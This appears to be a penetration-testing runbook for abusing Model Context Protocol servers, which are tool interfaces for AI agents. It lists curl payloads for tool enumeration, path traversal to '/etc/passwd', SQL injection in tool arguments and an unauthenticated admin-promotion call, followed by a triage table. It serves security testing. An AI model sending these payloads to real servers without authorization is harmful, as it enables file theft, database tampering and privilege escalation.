# MCP Server Abuse Testing Runbook

## Purpose
Test MCP (Model Context Protocol) servers for unauthorized tool access, authentication bypass, argument injection (SQLi, path traversal), tool chaining escalation, and parameter validation bypass.

## Prerequisites
- `$OUTDIR/ai-llm/mcp_endpoints.txt` from surface discovery
- Python 3.10+ with `requests` library
- Understanding of MCP JSON-RPC 2.0 protocol

## Variables
| Variable | Source | Description |
|----------|--------|-------------|
| `OUTDIR` | `.bb/context.env` | Output directory |
| `CONTEXT` | `.bb/context.json` | Run context with auth configuration |

## Command

### Step 1 — Automated MCP fuzzer
```bash
python3 .claude/skills/ai-llm/scripts/mcp_fuzzer.py \
  --context .bb/context.json \
  --mcp-urls $OUTDIR/ai-llm/mcp_endpoints.txt \
  --output $OUTDIR/ai-llm/mcp_findings.jsonl
```

### Step 2 — Manual tool enumeration
```bash
MCP_URL="https://TARGET/.well-known/mcp"

curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' \
  | jq . | tee $OUTDIR/ai-llm/mcp/evidence/tools_list.json
```

### Step 3 — Path traversal in tool arguments
```bash
curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"file_read","arguments":{"path":"../../../etc/passwd"}}}' \
  | tee $OUTDIR/ai-llm/mcp/evidence/path_traversal.json
```

### Step 4 — SQL injection in tool arguments
```bash
curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"db_query","arguments":{"sql":"SELECT * FROM users WHERE username=\"admin\" OR \"1\"=\"1\""}}}' \
  | tee $OUTDIR/ai-llm/mcp/evidence/sqli_tool.json
```

### Step 5 — Unauthenticated tool call
```bash
curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"admin_promote","arguments":{"user":"attacker"}}}' \
  | tee $OUTDIR/ai-llm/mcp/evidence/auth_bypass.json
```

## Expected Output

| File | Contents |
|------|----------|
| `$OUTDIR/ai-llm/mcp_findings.jsonl` | All MCP abuse findings |
| `evidence/tools_list.json` | Discovered MCP tools |
| `evidence/path_traversal.json` | Path traversal test result |
| `evidence/sqli_tool.json` | SQL injection in tool args |
| `evidence/auth_bypass.json` | Unauthenticated tool call |

Each JSONL finding includes: `mcp_url`, `tool_name`, `attack_type`, `arguments_sent`, `response`, `auth_bypass`, `injection_success`, `finding`, `confidence`.

## Triage Guide

| Observation | Meaning | Action |
|-------------|---------|--------|
| tools/list returns tools without auth header required | Auth bypass on tool listing | Critical |
| tools/call succeeds without authentication | Unauth tool execution | Critical |
| Path traversal returns file content from outside allowed dir | Path traversal via MCP | Critical |
| SQL injection in tool arg modifies query result | SQLi via MCP | Critical |
| Chained tool calls (tool A output feeds tool B) escalate access | Tool chaining | Critical |
| Missing required params crash tool or return verbose error | Error info leak | Medium |
| tools/list returns empty with auth, but tools exposed via error message | Information disclosure | Medium |
| Tool requires OAuth bearer token and validates it | Auth working | Safe |
| Parameter schema enforced and rejects injection attempts | Input validated | Safe |
| Rate limiting on tools/list prevents enumeration | Rate limited | Low — note for DoS potential |